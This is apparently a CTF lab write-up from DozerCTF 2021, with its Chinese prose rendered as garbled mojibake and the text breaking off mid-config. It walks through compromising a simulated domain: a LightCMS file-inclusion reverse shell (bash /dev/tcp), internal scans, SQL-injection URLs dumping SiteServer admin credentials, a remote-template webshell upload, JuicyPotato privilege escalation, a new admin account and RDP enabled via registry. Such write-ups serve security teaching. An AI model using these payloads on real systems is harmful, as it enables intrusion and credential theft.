ä¸è¿‡é‡Œé¢æœ‰ä¸ªåŸŸæ¸—é€çš„é¢˜ç›®è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œæ­£å¥½å’±è¿˜æ²¡ç©è¿‡åŸŸæ¸—é€ï¼Œè¶è¿™ä¸ªæœºä¼šå°±æ¥å­¦ä¸€ä¸‹ç›¸å…³çš„çŸ¥è¯†ï¼Œæ¥ç»ƒç»ƒæ‰‹ã€‚ é¢˜ç›®æè¿°ï¼š ç›®æ ‡äººç‰©flagï¼Œæ¨¡æ‹Ÿä¸€æ¬¡çº¢é˜Ÿè¡ŒåŠ¨å§ã€‚ http://web1.dozer.team:8082/ ï¼ˆè¿™ç¯‡æ–‡ç« å‘å‡ºæ¥çš„æ—¶å€™ç¯å¢ƒå·²ç»å…³äº†ï¼‰ ç”±äºæœ€è¿‘æ¯”è¾ƒå¿™ï¼Œè¿™é¢˜åœ¨æ¯”èµ›çš„æ—¶å€™æ²¡æ€ä¹ˆæ‰“ï¼Œå¤§éƒ¨åˆ†æ˜¯ä¹‹åå¤ç°çš„ï¼Œé¢˜ç›®ç¯å¢ƒé‡ç½®äº†å¥½å‡ æ¬¡ï¼Œç„¶è€Œå¤ç°çš„æ—¶å€™åŸŸç¯å¢ƒè¿˜æ˜¯è¢«å¸ˆå‚…ä»¬æ‰“çƒ‚äº†ã€‚ äºæ˜¯è¿™ç¯‡æ–‡ç« å°±ç®—æ˜¯ä¸ªæ¸—é€è¿‡ç¨‹çš„è®°å½•å§ï¼Œæ–­æ–­ç»­ç»­å†™çš„ï¼Œè¿‡ç¨‹ä¸­ç”±äºç¯å¢ƒé‡ç½®æˆ–è€… shell ä¸ç¨³å®šçš„åŸå› å¯¼è‡´é‡æ–°æ‰“äº†å¥½å‡ æ¬¡ï¼Œå‰åä¼šæœ‰äº›ä¸è¿ç»­ï¼Œæ“ä½œä¹Ÿä¸ç†Ÿæ‚‰ï¼Œå†™çš„ä¹Ÿæ¯”è¾ƒä¹±ï¼Œå¸ˆå‚…ä»¬éšæ„çœ‹çœ‹å°±å¥½äº†ã€‚Orz 0x01 10.10.1.47 LightCMSå…¥å£æ˜¯ LightCMS åå°ç™»å½•ä¿¡æ¯ç¾¤é‡Œå·²ç»ç»™äº† å³ dozer / dozer123 å‚è€ƒï¼š gml éƒ­é™¢å£«çš„ lightcmsåå°RCEæ¼æ´æŒ–æ˜ Ying å¸ˆå‚…çš„ LightCMSå…¨ç‰ˆæœ¬åå°RCE 0dayåˆ†æ LightCMS æ–‡ä»¶ä¸Šä¼ &amp;&amp;pharååºåˆ—åŒ–rceæ¼æ´å¤ç° å†è°ˆLaravel Debug mode RCEï¼ˆCVE-2021-3129ï¼‰æ¼æ´ GitHub: PHPGGC: PHP Generic Gadget Chains ç„¶è€Œå½“æ—¶ç”¨è¿™ä¸ªååºåˆ—åŒ–çš„æ´æ‰“ä¸é€šâ€¦â€¦æœ€åæ¢äº†ä¸ªæ‰“æ³•ã€‚ åœ¨ /admin/neditor/serve/catchimage æ¥å£å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯ä»¥è¯»å– /var/www/html/app/Http/Controllers/Admin/NEditorController.php æ–‡ä»¶ã€‚ å‘ç° /admin/neditor/serve/testInclude è¿™ä¸ªè·¯ç”±ä¸‹å¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œä»è€Œæ‰§è¡Œå‘½ä»¤ã€‚ é¦–å…ˆåœ¨å†…å®¹ç®¡ç†-æ–‡ç« è¿™é‡Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ã€‚ ç„¶ååœ¨è¿™ä¸ªè·¯ç”±ä¸‹æ‰§è¡Œï¼Œæ¯”å¦‚ï¼š 1=system('bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1');&amp;file=./upload/image/202105/iAWvVAZTHl35fVW29B5zk6iLh6G7K5tDQXL0PaX9.gif åœ¨ vps ä¸Šå°±èƒ½æ‹¿åˆ° shellï¼Œè¿›è€Œåœ¨æ ¹ç›®å½•ä¸‹æ‹¿åˆ°ç¬¬ä¸€ä¸ª flag äº†ã€‚ è¿™é‡Œå…¶å®æœ‰ä¸ªéé¢„æœŸï¼Œç³»ç»Ÿç®¡ç†ä¸‹æœ‰ä¸ªæ—¥å¿—çš„è®°å½•ï¼Œå¯ä»¥ç›´æ¥è¹­ä¹‹å‰å¸ˆå‚…çš„å°è½¦è½¦ï¼ŒçŸ¥é“äº† flag åœ¨ /flag_d0z3r ã€‚ åœ¨ catchimage æ¥å£ç›´æ¥è®¿é—®å“åº”é‡Œçš„ urlï¼Œå†…å®¹å°±æ˜¯ flagã€‚ æœé›†å†…ç½‘ä¿¡æ¯ifconfig é¡ºä¾¿å‘ç°ä»–ç”¨çš„ lightcms ç‰ˆæœ¬æ˜¯ 1.3.5 é¡ºä¾¿çœ‹ä¸‹é…ç½®æ–‡ä»¶ã€‚ /var/www/html/config/database.php env çœ‹ä¸‹ç¯å¢ƒå˜é‡ã€‚ äºæ˜¯çŸ¥é“äº†æ•°æ®åº“æ˜¯ MySQLï¼Œç”¨æˆ·å/å¯†ç å‡ä¸º user1. ï¼ˆç™»ä¸Šå»çœ‹äº†çœ‹ï¼Œè²Œä¼¼æ²¡å•¥ç”¨ æ‰”ä¸ª kscan ä¸Šå»ï¼Œæ‰«ä¸€æ³¢å†…ç½‘ã€‚ [âˆš]ssh://10.10.1.47:22 42 SSH-2.0-Op Product:OpenSSH,Version:7.2p2 Ubuntu 4ubuntu2.10,OS:Linux,DeviceType:Ubuntu Linux; protocol 2.0,OtherInfo:Ubuntu Linux; protocol 2.0 [âˆš]microsoft-ds://10.10.1.1:445 103 cï¿½SMBrProduct:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows,HostName:DC01,DeviceType:workgroup: DOZER,OtherInfo:workgroup: DOZER [âˆš]microsoft-ds://10.10.1.234:445 133 ï¿½ï¿½SMBr Product:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows Server 2008 R2 - 2012 [âˆš]microsoft-ds://10.10.1.231:445 117 qï¿½SMBrProduct:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows Server 2008 R2 - 2012 [âˆš]microsoft-ds://10.10.1.250:445 105 eï¿½SMBrProduct:Microsoft Windows Server 2008 R2 - 2012 microsoft-ds,OS:Windows Server 2008 R2 - 2012 [âˆš]https://10.10.1.231:3389 512 QM`ï¿½ï¿½N [âˆš]http://10.10.1.47:80 200 Laravel Product:nginx,Version:1.10.3,OS:Linux,DeviceType:Ubuntu,OtherInfo:Ubuntu,server:nginx/1.10.3 (Ubuntu), ä½¿ç”¨å¯ä»¥åˆ é™¤ç›¸å…³è·¯ç”±ï¼ˆroutes/web.phpã€rout [âˆš]http://10.10.1.100:80 403 HTTP/1.1 4 Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0 [âˆš]http://10.10.1.122:80 200 Apache2UbuntuDefaultPage:Itworks Product:Apache httpd,Version:2.4.18,DeviceType:(Ubuntu),OtherInfo:(Ubuntu),server:Apache/2.4.18 (Ubuntu),rticularconfigurationsnippetsw [âˆš]http://10.10.1.231:80 404 HTTP/1.1 4 Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0 [âˆš]http://10.10.1.234:80 200 HTTP/1.1 2 Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0 [âˆš]http://10.10.1.100:81 403 403-ç¦æ­¢è®¿é—®:è®¿é—®è¢«æ‹’ç»ã€‚ Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0,:è®¿é—®è¢«æ‹’ç»ã€‚æœåŠ¡å™¨é”™è¯¯403-ç¦æ­¢è®¿é—®:è®¿é—®è¢«æ‹’ç»ã€‚æ‚¨æ— æƒ [âˆš]http://10.10.1.250:80 200 DozerCTF2021â€“åˆä¸€ä¸ªWordPressç«™ç‚¹ Product:Apache httpd,Version:2.4.39,DeviceType:(Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,OtherInfo:(Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,server:Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02,RSSWordPress.orgDozerCTF2021,è‡ª [âˆš]mysql://10.10.1.250:3306 71 Cï¿½jHost Product:MySQL,DeviceType:unauthorized,OtherInfo:unauthorized [âˆš]http://10.10.1.122:8888 200 Directorylistingfor/ Product:SimpleHTTPServer,Version:0.6,DeviceType:Python 3.5.2,OtherInfo:Python 3.5.2,server:SimpleHTTP/0.6 Python/3.5.2,ldNZOmxkq3769/ctLoSsHXtMKzmiPz [âˆš]http://10.10.1.122:9999 200 Directorylistingfor/ Product:SimpleHTTPServer,Version:0.6,DeviceType:Python 3.5.2,OtherInfo:Python 3.5.2,server:SimpleHTTP/0.6 Python/3.5.2,private-84758d0d58d44984879202 [âˆš]https://10.10.1.100:443 200 Outlook Product:Microsoft IIS httpd,Version:8.0,OS:Windows,server:Microsoft-IIS/8.0,94jMMZwmJD5JAhCfWPm0e2+MGKDYRQ,CN=exch å¤§æ¦‚åŒ…æ‹¬ï¼š 10.10.1.1 åŸŸæ§ http://10.10.1.47 æœ¬æœº https://10.10.1.100:443 Outlook Exchange http://10.10.1.122 ä¸€ä¸ª web æœåŠ¡å™¨ Apache httpd http://10.10.1.231 å¦ä¸€ä¸ª web æœåŠ¡å™¨ IIS http://10.10.1.234 web æœåŠ¡å™¨ IIS http://10.10.1.250/ wordpress è¿™é‡Œä¹‹åå¤ç°çš„æ—¶å€™æ•´ä¸ªåŸŸç¯å¢ƒéƒ½é‡ç½®äº†ï¼Œä¸¢äº†ä¸ª fscan ä¸Šå»é‡æ–°æ‰«äº†ä¸€æ³¢ã€‚ ï¼ˆè¿˜æ˜¯ fscan çœ‹èµ·æ¥æ›´èˆ’æœä¸€ç‚¹ # ./fscan -h 10.10.1.1/24 10.10.1.1:139 open 10.10.1.231:139 open 10.10.1.234:139 open 10.10.1.250:139 open 10.10.1.121:139 open 10.10.1.250:135 open 10.10.1.234:135 open 10.10.1.121:135 open 10.10.1.1:135 open 10.10.1.47:22 open 10.10.1.231:135 open 10.10.1.100:81 open 10.10.1.250:80 open 10.10.1.234:80 open 10.10.1.231:80 open 10.10.1.122:80 open 10.10.1.100:443 open 10.10.1.100:808 open 10.10.1.250:3306 open 10.10.1.231:1433 open 10.10.1.231:445 open 10.10.1.234:445 open 10.10.1.250:445 open 10.10.1.121:445 open 10.10.1.1:445 open 10.10.1.122:1080 open 10.10.1.100:80 open 10.10.1.47:80 open 10.10.1.122:8000 open 10.10.1.122:9000 open 10.10.1.122:8080 open 10.10.1.100:8172 open 10.10.1.122:9096 open 10.10.1.122:9090 open 10.10.1.122:10010 open 10.10.1.1:88 open [*] 10.10.1.121 DOZER\\DESKTOP-ALICE Windows Server 2012 Datacenter 9200 NetInfo: [*]10.10.1.121 [-&gt;]Deskto-Alice [-&gt;]10.10.1.121 NetInfo: [*]10.10.1.1 [-&gt;]dc01 [-&gt;]10.10.1.1 NetInfo: [*]10.10.1.234 [-&gt;]WIN-UIARPOTP0AL [-&gt;]10.10.1.234 [*] 10.10.1.1 [+]DC DOZER\\DC01 Windows Server 2012 Standard 9200 [*] 10.10.1.234 WORKGROUP\\WIN-UIARPOTP0AL Windows Server 2012 Datacenter 9200 [*] 10.10.1.1 (Windows Server 2012 Standard 9200) [*] 10.10.1.231 DOZER\\SQLSERVER14 Windows Server 2012 Standard 9200 NetInfo: [*]10.10.1.231 [-&gt;]Sqlserver14 [-&gt;]10.10.1.231 [*] WebTitle:http://10.10.1.100 code:403 len:0 title:None [*] WebTitle:http://10.10.1.47 code:200 len:7 title:Laravel [*] WebTitle:http://10.10.1.100:81 code:403 len:1157 title:403 - ç¦æ­¢è®¿é—®: è®¿é—®è¢«æ‹’ç»ã€‚ [*] WebTitle:https://10.10.1.100 code:302 len:0 title:None [*] WebTitle:http://10.10.1.122 code:200 len:37 title:Apache2 Ubuntu Default Page: It works [*] WebTitle:http://10.10.1.231 code:404 len:0 title:None NetInfo: [*]10.10.1.250 [-&gt;]web02 [-&gt;]10.10.1.250 [*] 10.10.1.250 DOZER\\WEB02 Windows Server 2012 Standard 9200 [*] WebTitle:http://10.10.1.122:8080 code:200 len:10795 title:DozerCTF 2021 &amp;#8211; åˆä¸€ä¸ªWordPressç«™ç‚¹ [*] WebTitle:http://10.10.1.122:9000 code:200 len:11321 title:Apache2 Ubuntu Default Page: It works [*] WebTitle:https://10.10.1.100/owa/ code:200 len:28240 title:Outlook [*] WebTitle:http://10.10.1.234 code:200 len:171 title:None [*] WebTitle:http://10.10.1.250 code:200 len:46 title:DozerCTF 2021 &amp;#8211; åˆä¸€ä¸ªWordPressç«™ç‚¹ å™¢è¿˜æ¼äº†ä¸ª 10.10.1.121 DOZER\\DESKTOP-ALICEï¼Œä¸Šé¢è¯´ä¸å®šè¿˜æœ‰åŸŸç®¡çš„ hashã€‚ åœ¨ 10.10.1.47 ä¸Šç”¨ frp / iox ä¹‹ç±»çš„å¼€ä¸ª socks ä»£ç†åˆ°è‡ªå·±çš„ vpsï¼Œç„¶åå†è½¬å‘åˆ°æœ¬åœ°ï¼Œè¿™æ ·å°±èƒ½ç›´æ¥ä»æœ¬åœ°è¿åˆ°å†…ç½‘é‡Œäº†ã€‚ Linux ä¸‹ç›´æ¥åœ¨ proxychains é‡Œé…å¥½ socks è¿æ¥ï¼Œè€Œåæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ç›´æ¥ proxychains è¦æ‰§è¡Œçš„å‘½ä»¤ å°±å®Œäº‹äº†ã€‚ å¯ä»¥å‚è€ƒ å†…ç½‘æ¸—é€ä¹‹ç«¯å£è½¬å‘ä¸ä»£ç†å·¥å…·æ€»ç»“ 0x02 10.10.1.234 SiteServer Hint: æœ‰ä¸€æ¬¡ï¼Œè¿ç»´äººå‘˜åœ¨åƒé¥­çš„æ—¶å€™æåˆ°äº†ä»–ä»¬ç”¨äº†siteserver ç›´æ¥è®¿é—® http://10.10.1.234/ å¾—åˆ° &lt;script&gt;var $pageInfo = {publishmentSystemID : 1, channelID : 1, contentID : 0, siteUrl : \"\", homeUrl : \"/home\", currentUrl : \"/\", rootUrl : \"\", apiUrl : \"/api\"};&lt;/script&gt; åˆ©ç”¨æŠ¥é”™ï¼Œå‘ç°äº†ä»–ç›®å½•æ˜¯ /siteserver/ è¿›è€Œå‘ç°æ˜¯ä¸ª siteserver ç™»å½•é¡µé¢ï¼š http://10.10.1.234/siteserver/login.aspx å‚è€ƒ æº¯æºå¤ç°SiteServer5ç–‘ä¼¼åœ¨é‡0day å¯ä»¥åˆ†åˆ«æ‹¿åˆ° UserNameã€Passwordã€PasswordSaltã€‚ http://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20Username%20from%20bairong_Administrator-- Admin http://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%201%20Password%20from%20bairong_Administrator-- leonsec http://10.10.1.234/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20PasswordSalt%20from%20bairong_Administrator-- D79FHgmyyy5RH7WnljqNBQ== ï¼ˆä¸è¿‡è²Œä¼¼æ²¡å•¥ç”¨ ç„¶åæŸ¥ä¸€æŸ¥ SiteServer æœ‰å•¥æ¼æ´ï¼Œæœç„¶å°±æœ‰ç°æˆçš„ã€‚ ç®€è®°é‡ç”Ÿåº”æ€¥æ•è·åˆ°çš„siteserverè¿œç¨‹æ¨¡æ¿ä¸‹è½½Getshellæ¼æ´ SiteServer CMS 5.x æ¼æ´å¤ç°&amp;åˆ†æ https://github.com/zhaoweiho/SiteServer-CMS-Remote-download-Getshell å‘ç°ç›´æ¥æ‰“è¿‡å»æ— æ³•è®¿é—®ï¼Œå™¢ GitHub å•Šï¼Œæ²¡äº‹äº†ã€‚ é‚£è¯•è¯• fastgit çš„ä»£ç†ã€‚ é¦–å…ˆæŒ‰ç…§ README çš„è¯´æ˜ï¼ŒæŠŠ downloadurl ç»™æ¢æ‰ã€‚ æ‡’å¾—é… C# ç¯å¢ƒäº†ï¼Œç›´æ¥æ‰¾äº†ä¸ªåœ¨çº¿çš„æ‰§è¡Œå°±å®Œäº‹äº†ã€‚ http://www.dooccn.com/csharp/ using System; using System.IO; using System.Security.Cryptography; using System.Text; namespace EncryptApplication { class Encrypt { static void Main(string[] args) { var _encryptKey = \"vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5\"; var _decryptKey = \"vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5\"; var _inputString = \"https://raw.fastgit.org/zhaoweiho/SiteServerCMS-Remote-download-Getshell/master/webshell/poxteam.zip\"; var _outString = \"\"; var _noteMessage = \"\"; byte[] iv = { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF }; try{ var byKey = Encoding.UTF8.GetBytes(_encryptKey.Length &gt; 8 ? _encryptKey.Substring(0, 8) : _encryptKey); var des = new DESCryptoServiceProvider(); var inputByteArray = Encoding.UTF8.GetBytes(_inputString); var ms = new MemoryStream(); var cs = new CryptoStream(ms, des.CreateEncryptor(byKey, iv), CryptoStreamMode.Write); cs.Write(inputByteArray, 0, inputByteArray.Length); cs.FlushFinalBlock(); _outString = Convert.ToBase64String(ms.ToArray()); Console.WriteLine(\"DesEncrypt:\"); Console.WriteLine(_outString); } catch (Exception error) { _noteMessage = error.Message; } } } } ç”Ÿæˆçš„åœ°å€å†ç”¨ python æ›¿æ¢ä¸€ä¸‹å‡ ä¸ªå­—ç¬¦ã€‚ aZlBAFKTavDq1a13yzD3E1jziPhCL9Y1W0HUgoWERF7oXIBq9tKZFNVSSoWFIGM+wUVVDMPLriIYZOrTHFNH6wuBxt9fr/hX771Ey8w4BJ0t1koCOIzYQO2arzX9xfWGb1bTT6ElmWU= # python str_decry.replace(\"+\", \"0add0\").replace(\"=\", \"0equals0\").replace(\"&amp;\", \"0and0\").replace(\"?\", \"0question0\").replace(\"/\", \"0slash0\") aZlBAFKTavDq1a13yzD3E1jziPhCL9Y1W0HUgoWERF7oXIBq9tKZFNVSSoWFIGM0add0wUVVDMPLriIYZOrTHFNH6wuBxt9fr0slash0hX771Ey8w4BJ0t1koCOIzYQO2arzX9xfWGb1bTT6ElmWU0equals0 ï¼Ÿï¼Ÿï¼Ÿæ€ä¹ˆè¿˜æ˜¯ä¸è¡Œï¼Ÿ äºæ˜¯æ”¾è‡ªå·± vps ä¸Šè¯•äº†è¯•ï¼Œå‘ç°æ ¹æœ¬æ²¡æœ‰è¯·æ±‚è®°å½•ï¼Œçœ‹æ¥ ä¸å‡ºç½‘ã€‚ æ°”æ­»äº†ã€‚ ä¹ˆå¾—åŠæ³•ï¼Œåªèƒ½å…ˆæŠŠæ–‡ä»¶ä¼ åˆ°æœ€å¼€å§‹çš„æœºå™¨ä¸Šï¼Œç„¶åèµ·ä¸ª web æœåŠ¡ï¼Œå†æŠŠæ–‡ä»¶é€šè¿‡è¿™å°ä¸‹è½½ã€‚ http://10.10.1.47:12345/poxteam.zip ZjYIub/YxA05+dg8BqV7gX//DhYyedHPT79r6KQFp5dKGh7t/3uUZA== ZjYIub0slash0YxA050add0dg8BqV7gX0slash00slash0DhYyedHPT79r6KQFp5dKGh7t0slash03uUZA0equals00equals0 http://10.10.1.234/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&amp;userKeyPrefix=test&amp;downloadUrl=ZjYIub0slash0YxA050add0dg8BqV7gX0slash00slash0DhYyedHPT79r6KQFp5dKGh7t0slash03uUZA0equals00equals0&amp;directoryName=test233 ç»ˆäºæ‹¿åˆ°é©¬äº†ã€‚ http://10.10.1.234/SiteFiles/SiteTemplates/test233/include.aspx å¥½è€¶ï¼ å¥½å®¶ä¼™ï¼Œä¸€å †çš„ shellã€‚ çœ‹äº†ä¸‹è¿™å°æœºå™¨è²Œä¼¼æ²¡æœ‰åŸŸç¯å¢ƒã€‚ ç„¶åæ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ° flag åœ¨å“ªâ€¦â€¦ å†æ•´ä¸ªå†°èğŸä¼ ä¸Šå»ã€‚ # whoami iis apppool\\defaultapppool systeminfo ä¸»æœºå: WIN-UIARPOTP0AL OS åç§°: Microsoft Windows Server 2012 Datacenter OS ç‰ˆæœ¬: 6.2.9200 æš‚ç¼º Build 9200 OS åˆ¶é€ å•†: Microsoft Corporation OS é…ç½®: ç‹¬ç«‹æœåŠ¡å™¨ OS æ„ä»¶ç±»å‹: Multiprocessor Free æ³¨å†Œçš„æ‰€æœ‰äºº: Windows ç”¨æˆ· æ³¨å†Œçš„ç»„ç»‡: äº§å“ ID: 00184-70000-00000-AA252 åˆå§‹å®‰è£…æ—¥æœŸ: 2021/5/15, 19:55:24 ç³»ç»Ÿå¯åŠ¨æ—¶é—´: 2021/5/30, 12:38:55 ç³»ç»Ÿåˆ¶é€ å•†: VMware, Inc. ç³»ç»Ÿå‹å·: VMware Virtual Platform ç³»ç»Ÿç±»å‹: x64-based PC å¤„ç†å™¨: å®‰è£…äº† 1 ä¸ªå¤„ç†å™¨ã€‚ [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~1796 Mhz BIOS ç‰ˆæœ¬: Phoenix Technologies LTD 6.00, 2019/7/29 Windows ç›®å½•: C:\\Windows ç³»ç»Ÿç›®å½•: C:\\Windows\\system32 å¯åŠ¨è®¾å¤‡: \\Device\\HarddiskVolume1 ç³»ç»ŸåŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½) è¾“å…¥æ³•åŒºåŸŸè®¾ç½®: zh-cn;ä¸­æ–‡(ä¸­å›½) æ—¶åŒº: (UTC+08:00)åŒ—äº¬ï¼Œé‡åº†ï¼Œé¦™æ¸¯ç‰¹åˆ«è¡Œæ”¿åŒºï¼Œä¹Œé²æœ¨é½ ç‰©ç†å†…å­˜æ€»é‡: 2,047 MB å¯ç”¨çš„ç‰©ç†å†…å­˜: 1,243 MB è™šæ‹Ÿå†…å­˜: æœ€å¤§å€¼: 4,095 MB è™šæ‹Ÿå†…å­˜: å¯ç”¨: 3,017 MB è™šæ‹Ÿå†…å­˜: ä½¿ç”¨ä¸­: 1,078 MB é¡µé¢æ–‡ä»¶ä½ç½®: C:\\pagefile.sys åŸŸ: WORKGROUP ç™»å½•æœåŠ¡å™¨: æš‚ç¼º ä¿®è¡¥ç¨‹åº: å®‰è£…äº† 2 ä¸ªä¿®è¡¥ç¨‹åºã€‚ [01]: KB2999226 [02]: KB4012214 ç½‘å¡: å®‰è£…äº† 1 ä¸ª NICã€‚ [01]: Intel(R) 82574L åƒå…†ç½‘ç»œè¿æ¥ è¿æ¥å: Ethernet0 å¯ç”¨ DHCP: å¦ IP åœ°å€ [01]: 10.10.1.234 [02]: fe80::4446:784:6de4:d42a Hyper-V è¦æ±‚: å·²æ£€æµ‹åˆ°è™šæ‹Ÿæœºç›‘æ§ç¨‹åºã€‚å°†ä¸æ˜¾ç¤º Hyper-V æ‰€éœ€çš„åŠŸèƒ½ã€‚ å¯»æ€ç€ flag æ˜¯ä¸æ˜¯æ”¾åœ¨ Administrator ç”¨æˆ·æ¡Œé¢ä¸Šå‘¢ï¼Ÿï¼ˆè™½ç„¶æœ€åå‘ç°å¹¶æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶å¤¹ è¯•äº†å¥½å‡ ç§ææƒæ–¹æ³•ï¼Œä½†ä¸€èˆ¬éƒ½æ˜¯ msf æˆ–è€… CS æˆ–è€…å°±è¿œç¨‹ä¸Šå»å¼¹çª—å£çš„ï¼Œè¯•äº†éƒ½ä¹ˆå¾—ç”¨ã€‚ å‘ç°ç”¨çš„å†°èçš„ä»£ç æ‰§è¡Œæœ‰ç‚¹é—®é¢˜ï¼Œäºæ˜¯å†æ‰“äº†ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç”¨èšå‰‘è¿ä¸Šå»ã€‚ æœ€åæ•´äº†ä¸ªçƒ‚åœŸè±†ï¼Œç›´æ¥åœ¨ webshell ææƒå¥½äº†ã€‚ ä¸è¿‡æœ‰ä¸ªç¼ºç‚¹æ˜¯è²Œä¼¼åªèƒ½æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼ˆï¼Ÿï¼‰ï¼Œå””ã€‚ è²Œä¼¼ä¹Ÿæ‰¾ä¸åˆ° flag åœ¨å“ªå•Šâ€¦â€¦ åˆå»æ‰¾äº†åˆ«äººçš„ææƒè¿‡ç¨‹â€¦â€¦ æ¯”å¦‚ è®°ä¸€æ¬¡Windowsæ¸—é€ææƒå†ç¨‹ æ–°å»ºä¸ªè´¦å·ï¼Œæ·»åŠ åˆ°ç®¡ç†ç»„é‡Œã€‚è¿™é‡Œå°±ä¸æ•´å½±å­ç”¨æˆ·äº†ã€‚ net user root test456123! net localgroup administrators root /add å¼€å¯è¿œç¨‹æ¡Œé¢ã€‚ JuicyPotatoweb.exe -p \"REG ADD \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\" JuicyPotatoweb.exe -p \"REG ADD \\\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\\\" /v PortNumber /t REG_DWORD /d 0x00000d3d /f\" REG QUERY \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections æœ€åä¸€è¡Œå‘½ä»¤æ˜¯æŸ¥è¯¢è¿œç¨‹æ¡Œé¢æ˜¯å¦å¼€å¯ï¼Œ0x0 è¡¨ç¤ºå¼€å¯ï¼Œ0x1 è¡¨ç¤ºå…³é—­ã€‚ è¿™é‡Œå‘ç° rdesktop åˆè¿ä¸ä¸Šï¼Œæç¤º Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option). å‚è€ƒ rdesktopè¿æ¥Windowsè¿œç¨‹æ¡Œé¢å› CredSSP æŠ¥é”™è§£å†³åŠæ³• æŠ˜è…¾äº†åŠå¤©ï¼Œæœ€åæ¢äº† remmina è¿ä¸Šäº†ã€‚ ä¸Šå»æ‰¾äº†ä¸€æ³¢å•¥ä¹Ÿæ²¡æ‰¾åˆ°ï¼Œæœ€åå‘ç°æ˜¯åœ¨ç½‘ç«™æ ¹ç›®å½•çš„ Web.config.bakâ€¦ æ°”æ­»å–µå–µäº†ã€‚ é‚£ç›´æ¥åœ¨æœ€å¼€å§‹çš„é©¬å°±èƒ½æ‹¿åˆ°äº†å•Šï¼Œåè€¶ï¼ DozerCTF{b59d9f9e843dedb09e407849f3396cb1} å†çœ‹ Web.config &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;configuration&gt; &lt;appSettings&gt; &lt;add key=\"IsProtectData\" value=\"True\" /&gt; &lt;add key=\"DatabaseType\" value=\"9XtLPj6oytMAr6M9jZ0Xvg0equals00equals0\" /&gt; &lt;add key=\"ConnectionString\" value=\"Zg3p37CSquO0slash0DelgBGFVO0J0BlhMxqbj6HR98UP8h4kojeoW8A0slash0xZh4im63w0tn2nuW7n5XRcDo0equals0\" /&gt; &lt;/appSettings&gt; &lt;system.web&gt; &lt;httpRuntime requestValidationMode=\"2.0\" requestPathInvalidCharacters=\"\" maxRequestLength=\"40960\" executionTimeout=\"2000\" useFullyQualifiedRedirectUrl=\"false\" minFreeThreads=\"8\" minLocalRequestFreeThreads=\"4\" appRequestQueueLimit=\"100\" enableVersionHeader=\"false\" /&gt; &lt;pages validateRequest=\"false\" enableSessionState=\"true\" enableViewState=\"true\" enableEventValidation=\"false\" controlRenderingCompatibilityVersion=\"4.0\" clientIDMode=\"AutoID\" /&gt; &lt;customErrors mode=\"Off\" /&gt; &lt;sessionState mode=\"InProc\" timeout=\"30\" /&gt; &lt;trace enabled=\"false\" requestLimit=\"1000\" pageOutput=\"true\" traceMode=\"SortByTime\" localOnly=\"true\" /&gt; &lt;globalization fileEncoding=\"utf-8\" requestEncoding=\"utf-8\" responseEncoding=\"utf-8\" /&gt; &lt;compilation debug=\"false\" /&gt; &lt;/system.web&gt; &lt;system.webServer&gt; &lt;modules&gt; &lt;!--iisnodeé»˜è®¤ä¸æ”¯æŒPUTå’ŒDELETEçš„è§£å†³--&gt; &lt;remove name=\"WebDAVModule\" /&gt; &lt;!--è·¯ç”±æ¨¡å‹åˆ æ‰å†åŠ ä¸€æ¬¡--&gt; &lt;remove name=\"UrlRoutingModule-4.0\" /&gt; &lt;add name=\"UrlRoutingModule-4.0\" type=\"System.Web.Routing.UrlRoutingModule\" preCondition=\"\" /&gt; &lt;add name=\"ErrorRedirectModule\" type=\"SiteServer.API.ErrorRedirectModule, SiteServer.API\" /&gt; &lt;/modules&gt; &lt;handlers&gt; &lt;remove name=\"ExtensionlessUrlHandler-Integrated-4.0\" /&gt; &lt;remove name=\"OPTIONSVerbHandler\" /&gt; &lt;remove name=\"TRACEVerbHandler\" /&gt; &lt;add name=\"ExtensionlessUrlHandler-Integrated-4.0\" path=\"*.\" verb=\"*\" 